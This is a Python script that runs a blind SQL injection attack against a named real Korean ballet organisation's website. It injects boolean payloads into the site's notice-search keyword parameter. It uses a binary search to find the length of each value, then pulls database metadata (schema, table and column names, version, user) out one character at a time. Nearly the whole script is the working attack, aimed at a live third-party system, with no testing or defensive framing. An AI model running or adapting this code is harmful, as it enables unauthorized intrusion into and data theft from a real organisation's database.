import requests
import threading
from urllib import parse
from lxml.html import fromstring, tostring


class RequestingGET(threading.Thread):
    url=None
    header=None
    body=None
    payload=None

    xpath=None
    keyword=None
    def __init__(self):
        threading.Thread.__init__(self,url,body,payload,xpath,keyword)
        self.url=url
        self.body=body
        self.payload=payload
        self.xpath=xpath
        self.keyword=keyword

    def responseCheck(self):
        pass

    def run(self):
        pass

    def start(self):
        threading.Thread.start(self)


class RequestingPOST(threading.Thread):
    url=None
    body=None
    payload=None

    xpath=None
    keyword=None
    def __init__(self):
        threading.Thread.__init__(self,url,body,payload,xpath,keyword)
        self.url=url
        self.body=body
        self.payload=payload
        self.xpath=xpath
        self.keyword=keyword

    def responseCheck(self):
        pass

    def run(self):
        pass

    def start(self):
        threading.Thread.start(self)

#문자열 일치 시 참
def isQueryTrue(response,xpath,keyword):
    doc=fromstring(response.content)
    result=doc.xpath(xpath)
    if not result or result[0]!=keyword:
        return False
    else:
        return True

url="http://www.korean-national-ballet.kr/ko/news/notice/list"
body={"s_field":"title","s_keyword":""}
xpath="""//*[@id="container"]/div[2]/div[2]/ul/li/div/a/strong[1]/text()"""
keyword="[ê³µì§\x80] êµ\xadê°\x80ê³µê³µê¸°ê´\x80 ì\x82¬ì\x9d´ë²\x84ì\x9c\x84í\x98\x91 'ê´\x80ì\x8b¬' ê²½ë³´ ë°\x9cë\xa0¹"
#target="(SELECT table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='koreanballet' limit 2,1)"
target="(SELECT column_name FROM information_schema.columns WHERE table_name='TB_ARCHIVE' limit 2,1)"
#target="version()"
#target="database()"
#target="user()"

print("타겟 : %s"%url)
print("추출대상 : %s"%target)


payload="주요%' AND 1=1#"



ex=""




def length(url,body,target,xpath,keyword,start=None,end=None,counter=None):
    if start==None:
        start=0
        end=100
    
    number= int((start+end) /2)

    for key,val in {'equal':'=','under':'<','over':'>'}.items():
        payload="관심%%' AND length(%s)%s%d#"%(target,val,number)
        body['s_keyword']=payload
        response=requests.get(url,params=body)
        if isQueryTrue(response,xpath,keyword):
            if key=='equal':
                return number
            elif key=='under':
                number=length(url,body,target,xpath,keyword,start,number-1)
            elif key=='over':
                number=length(url,body,target,xpath,keyword,number+1,end)

    return number


length=length(url,body,target,xpath,keyword)
    
print("%s의 길이는 %d입니다."%(target,length))
print("\n")


for i in range(1,length+1):
    for j in range(33,126):
        payload="관심%%' AND ascii(substr(%s,%d,1))=%d#"%(target,i,j)
        body['s_keyword']=payload
        response=requests.get(url,params=body)
        if isQueryTrue(response,xpath,keyword):
            print("%d번째 글자는 %s 입니다."%(i,chr(j)))
            ex=ex+chr(j)
            continue
        
print("\n")
print("%s 결과는 \n%s"%(target,ex))


